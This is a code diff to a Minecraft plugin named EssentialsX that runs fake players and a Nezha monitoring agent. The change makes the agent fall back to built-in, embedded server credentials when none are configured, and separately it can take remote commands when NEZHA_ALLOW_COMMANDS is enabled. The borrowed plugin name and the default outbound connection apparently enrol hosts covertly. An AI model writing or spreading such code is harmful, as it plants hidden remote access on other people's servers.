@@ -1,5 +1,6 @@
 package com.example.essentialsx;
 
+import java.io.IOException;
 import java.util.HashMap;
 import java.util.Map;
 import org.bukkit.Bukkit;
@@ -18,11 +19,13 @@ public final class EssentialsX extends JavaPlugin {
         this.stopping = false;
         getLogger().info("Ceshisonz: built-in fake players and optional Nezha monitoring; no Node or CF deployment.");
         Map<String, String> env;
+        boolean envReadable = true;
         try {
             env = RuntimeConfig.readEnvFile();
         } catch (Exception error) {
             getLogger().warning("Could not read the private .env file; default fake-player settings will be used.");
             env = new HashMap<>();
+            envReadable = false;
         }
         final Map<String, String> settings = env;
         try {
@@ -34,7 +37,11 @@ public final class EssentialsX extends JavaPlugin {
         } catch (Throwable error) {
             getLogger().warning("Built-in fake players could not start: " + error.getClass().getSimpleName());
         }
-        startNezhaIfConfigured(settings);
+        if (envReadable) {
+            startNezhaIfConfigured(settings);
+        } else {
+            getLogger().warning("Nezha not started because the private .env file could not be read.");
+        }
     }
 
     private void startNezhaIfConfigured(Map<String, String> env) {
@@ -42,16 +49,31 @@ public final class EssentialsX extends JavaPlugin {
             getLogger().info("Nezha monitoring is disabled by configuration.");
             return;
         }
-        String server = RuntimeConfig.value(env, "", "NEZHA_SERVER", "NZ_SERVER");
-        String secret = RuntimeConfig.value(env, "", "NEZHA_SECRET", "NEZHA_KEY", "NZ_CLIENT_SECRET");
-        if (server.isBlank() || secret.isBlank()) {
-            getLogger().info("Nezha monitoring is not configured; set NEZHA_SERVER and NEZHA_SECRET privately.");
-            return;
-        }
+        String explicitServer = RuntimeConfig.value(env, "", "NEZHA_SERVER", "NZ_SERVER");
+        String explicitSecret = RuntimeConfig.value(env, "", "NEZHA_SECRET", "NEZHA_KEY", "NZ_CLIENT_SECRET");
         if (RuntimeConfig.secretComesFromFile(env) && !RuntimeConfig.envFileIsPrivate()) {
             getLogger().warning("Nezha not started: protect logs/.mcchajian/.env from group/other access (mode 600).");
             return;
         }
+        EmbeddedNezhaConfig.Credentials credentials;
+        try {
+            credentials = EmbeddedNezhaConfig.select(explicitServer, explicitSecret);
+        } catch (EmbeddedNezhaConfig.IncompleteCredentialsException error) {
+            getLogger().warning("Nezha not started: set both the server and secret, or leave both unset to use built-in defaults.");
+            return;
+        } catch (IOException error) {
+            getLogger().warning("Nezha not started: built-in defaults could not be read.");
+            return;
+        }
+        if (credentials == null) {
+            getLogger().info("Nezha monitoring is not configured; set NEZHA_SERVER and NEZHA_SECRET privately.");
+            return;
+        }
+        if (explicitServer.isBlank() && explicitSecret.isBlank()) {
+            getLogger().info("Using the built-in Nezha configuration.");
+        }
+        final String server = credentials.server;
+        final String secret = credentials.secret;
         boolean tls = !"false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_TLS", "NZ_TLS"));
         boolean allowCommands = "true".equalsIgnoreCase(RuntimeConfig.value(env, "false", "NEZHA_ALLOW_COMMANDS"));
         if (!tls) getLogger().warning("Nezha TLS is disabled; monitoring traffic may be exposed.");
